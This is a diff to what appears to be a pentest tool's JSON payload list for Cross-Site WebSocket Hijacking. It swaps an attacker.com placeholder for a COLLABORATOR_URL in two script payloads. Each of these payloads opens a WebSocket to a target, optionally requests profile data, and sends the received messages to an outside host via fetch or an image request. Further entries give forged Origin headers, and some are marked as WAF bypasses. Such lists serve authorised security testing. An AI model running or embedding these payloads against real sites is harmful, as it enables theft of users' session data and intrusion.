@@ -4,8 +4,8 @@
     "cswsh": {
       "description": "Cross-Site WebSocket Hijacking (CSWSH) payloads",
       "payloads": [
-        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws');ws.onmessage=function(e){fetch('https://attacker.com/?d='+btoa(e.data))}</script>", "description": "Basic CSWSH — exfiltrate WebSocket messages to attacker", "waf_bypass": false},
-        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws');ws.onopen=function(){ws.send('{\"action\":\"get_profile\"}')};ws.onmessage=function(e){new Image().src='https://attacker.com/?d='+encodeURIComponent(e.data)}</script>", "description": "CSWSH with action trigger — request sensitive data then exfiltrate", "waf_bypass": false},
+        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws');ws.onmessage=function(e){fetch('https://COLLABORATOR_URL/?d='+btoa(e.data))}</script>", "description": "Basic CSWSH — exfiltrate WebSocket messages to Collaborator", "waf_bypass": false},
+        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws');ws.onopen=function(){ws.send('{\"action\":\"get_profile\"}')};ws.onmessage=function(e){new Image().src='https://COLLABORATOR_URL/?d='+encodeURIComponent(e.data)}</script>", "description": "CSWSH with action trigger — request sensitive data then exfiltrate to Collaborator", "waf_bypass": false},
         {"payload": "Origin: https://attacker.com", "description": "Origin header test — check if server validates WebSocket Origin", "waf_bypass": false},
         {"payload": "Origin: https://target.com.attacker.com", "description": "Subdomain confusion in Origin validation", "waf_bypass": true},
         {"payload": "Origin: null", "description": "Null origin — sandboxed iframe or data: URI bypass", "waf_bypass": true},
